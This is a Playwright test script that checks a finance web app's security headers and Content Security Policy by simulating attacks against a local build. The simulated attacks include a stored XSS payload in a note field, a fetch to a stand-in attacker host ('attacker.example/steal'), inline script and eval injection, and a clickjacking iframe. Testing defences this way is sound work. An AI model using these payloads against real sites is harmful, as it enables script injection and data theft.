// Security exercise: simulates common web attacks against the built app and checks that the
// defences in SECURITY.md stop them. Run against `npm run serve:secure` (dist/ with real headers).
//
//   npm run build && npm run serve:secure      (terminal 1)
//   npm run test:attack                        (terminal 2)
//
// First time only: npx playwright install chromium
import fs from 'node:fs';
import path from 'node:path';
import { chromium } from 'playwright';

const base = process.argv[2] ?? 'http://localhost:4174';
const evalProbe = path.resolve('dist/__evaltest.js');
fs.writeFileSync(
  evalProbe,
  "try { eval('1+1'); window.__eval = 'NOT blocked'; } catch (e) { window.__eval = 'blocked'; }\n" +
    "try { new Function('return 1')(); window.__fn = 'NOT blocked'; } catch (e) { window.__fn = 'blocked'; }\n",
);

const browser = await chromium.launch();
const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true, locale: 'id-ID', acceptDownloads: true });
const page = await ctx.newPage();
const violations = [];
const dialogs = [];
page.on('console', (m) => /Content Security Policy|Refused to/i.test(m.text()) && violations.push(m.text()));
page.on('dialog', async (d) => {
  dialogs.push(d.message());
  await d.dismiss();
});
const results = [];
const check = (name, passed, detail = '') => results.push({ name, passed, detail });

try {
  // 0. Security headers arrive
  const resp = await page.goto(base + '/#/onboarding');
  const h = resp.headers();
  for (const k of ['content-security-policy', 'strict-transport-security', 'x-frame-options', 'x-content-type-options', 'referrer-policy', 'permissions-policy']) {
    check(`header ${k}`, !!h[k]);
  }

  // 1. Normal use must not trip the CSP
  await page.waitForTimeout(2200); // intro animation
  await page.getByRole('button', { name: 'Coba dengan data contoh' }).click();
  await page.waitForURL(/#\/$/);
  for (const r of ['/transaksi', '/rekening', '/laporan', '/laporan?tab=budget', '/pengaturan']) {
    await page.goto(base + '/#' + r);
    await page.waitForTimeout(400);
  }
  check('normal use has no CSP violations', violations.length === 0, violations.join(' | '));

  // 2. Stored XSS: markup in a note must be shown as text, never executed
  await page.goto(base + '/#/tambah');
  for (const k of ['1', '2', '3']) await page.getByRole('button', { name: k, exact: true }).click();
  const payload = '<img src=x onerror=alert("xss")>';
  await page.getByPlaceholder('mis. Makan malam').fill(payload);
  await page.getByRole('button', { name: 'Simpan', exact: true }).click();
  await page.goto(base + '/#/transaksi');
  await page.waitForTimeout(500);
  check('stored XSS does not execute', dialogs.length === 0 && (await page.getByText(payload).first().isVisible()));

  // 3. Data exfiltration to another server
  const exfil = await page.evaluate(async () => {
    try {
      await fetch('https://attacker.example/steal?d=secret');
      return 'sent';
    } catch {
      return 'blocked';
    }
  });
  check('exfiltration to another domain blocked (connect-src)', exfil === 'blocked');

  // 4. Inline script injection
  const inline = await page.evaluate(
    () =>
      new Promise((res) => {
        window.__pwned = false;
        const s = document.createElement('script');
        s.textContent = 'window.__pwned = true';
        document.body.appendChild(s);
        setTimeout(() => res(window.__pwned), 100);
      }),
  );
  check('inline <script> blocked (script-src)', inline === false);

  // 5. eval / new Function, run from a same-origin file so the CSP applies
  const ev = await page.evaluate(
    () =>
      new Promise((res) => {
        const s = document.createElement('script');
        s.src = '__evaltest.js';
        s.onload = () => res([window.__eval, window.__fn]);
        s.onerror = () => res(['load failed', 'load failed']);
        document.body.appendChild(s);
      }),
  );
  check('eval() and new Function() blocked', ev[0] === 'blocked' && ev[1] === 'blocked', ev.join(', '));

  // 6. Clickjacking: another site frames the app
  const evil = await ctx.newPage();
  await evil.setContent(`<iframe src="${base}/" width="390" height="600"></iframe>`);
  await evil.waitForTimeout(1500);
  const frame = evil.frames().find((f) => f.url().startsWith(base));
  const framed = frame ? await frame.evaluate(() => document.body?.innerText?.length ?? 0).catch(() => 0) : 0;
  check('framing by another site blocked (frame-ancestors)', framed === 0);
} finally {
  await browser.close();
  fs.rmSync(evalProbe, { force: true });
}

for (const r of results) console.log(`${r.passed ? '✅' : '❌'} ${r.name}${r.detail && !r.passed ? `  → ${r.detail}` : ''}`);
const failed = results.filter((r) => !r.passed).length;
console.log(failed ? `\n${failed} check(s) FAILED` : `\nAll ${results.length} checks passed`);
process.exit(failed ? 1 : 0);
